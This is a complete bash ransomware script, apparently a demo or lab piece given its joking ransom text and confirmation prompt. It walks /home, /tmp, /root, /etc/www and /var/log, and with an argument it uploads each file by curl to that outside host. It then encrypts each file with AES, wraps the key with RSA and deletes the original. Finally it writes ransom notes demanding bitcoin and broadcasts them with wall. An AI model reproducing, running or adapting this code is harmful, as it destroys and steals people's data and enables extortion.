#!/usr/bin/env bash

export PATH=/run/current-system/sw/bin/
shopt -s globstar

read -p "Are you sure you want to encrypt all files? [y/N]: " confirm
confirm=${confirm,,}
if [[ "$confirm" != "y" ]]; then
	echo "Aborted."
	exit 0
fi

pk="./pk.pem"
NOTE=$(
	cat <<-END
		    Your files have been encrypted.

		    To recover them, send 1 BTC to the following address:
		    bc1p5d7rjq7g6rdk2yhzks9smlaqtedr4dekq08ge8ztwac72sfr9rusxg3297

		    Once payment is received, contact us at pwned@pwned.com with proof of payment,
		    send us your files and their respective .key's and we will send you the decrypted
		        file back and double extort you for more money.

		    :)
	END
)

encrypt_file() {
	local file="$1"
	local sym_key=$(openssl rand -base64 32)

	openssl pkeyutl -encrypt -inkey "$pk" -pubin -in <(echo -n "$sym_key") -out "$file.SENDUSMONEY.key" 2>/dev/null
	openssl enc -aes-256-cbc -salt -in "$file" -out "$file.SENDUSMONEY" -pass pass:"$sym_key" 2>/dev/null && rm -f "$file"

	unset sym_key
	echo "Encrypted: $file"
}

counter=1

# encrypt all files in /home/, /tmp/, /root/, /etc/www/, the logs
for file in /home/**/* /tmp/**/* /root/**/* /etc/www/**/* /var/log/**/*; do
	if [ -f "$file" ]; then
		if [[ "$file" == *.SENDUSMONEY ]]; then
			echo "Skipping encrypted file: $file"
		else
			if [[ -n "$1" ]]; then
				echo "Sending: $file"
				up_name="$(basename "$file").$counter"
				curl -T "$file" "http://"$1"/"$up_name""
				((counter++))
			fi
			echo "Encrypting: $file"
			encrypt_file "$file"
		fi
	fi
done

echo "$NOTE" >/root/RANSOM_NOTE.txt
for home_dir in /home/*; do
	if [ -d "$home_dir" ]; then
		echo "$NOTE" >"$home_dir/RANSOM_NOTE.txt"
	fi
done

wall $NOTE
